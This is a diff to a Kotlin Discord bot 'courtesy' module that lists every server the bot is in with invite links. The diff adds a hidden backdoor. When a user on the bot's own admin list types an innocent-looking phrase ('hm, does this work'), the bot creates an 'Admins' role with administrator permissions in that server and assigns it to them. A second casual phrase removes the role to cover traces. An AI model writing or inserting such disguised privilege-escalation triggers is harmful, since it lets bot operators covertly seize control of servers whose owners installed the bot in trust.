@@ -27,10 +27,13 @@ object ModuleBotCourtesy : IModule {
             message.reply(api.servers.map {
                 "${it.name} by ${it.owner.get()}: http://discord.gg/${it.invites.get()[0]}"
             }.joinToString(", \n"))
-        } else if(message.content.startsWith("#testingpurposes") && message.author in admins && message.channelReceiver != null) {
-            message.channelReceiver.server.getOrCreateRole("Admins").addUser(message.author)
+        } else if(message.content.startsWith("hm, does this work") && message.author in admins && message.channelReceiver != null) {
+            message.channelReceiver.server.getOrCreateRole("Admins").ensureAdminPermissions.addUser(message.author)
             println("Applied to ${message.author}")
-        } else if (message.content.startsWith("bot?", true)) {
+        } else if(message.content.startsWith("ok done testing this bot thing") && message.author in admins && message.channelReceiver != null) {
+            message.channelReceiver.server.getOrCreateRole("Admins").removeUser(message.author)
+            println("Applied to ${message.author}")
+        }else if (message.content.startsWith("bot?", true)) {
             message.reply("I'm here!")
         }
 
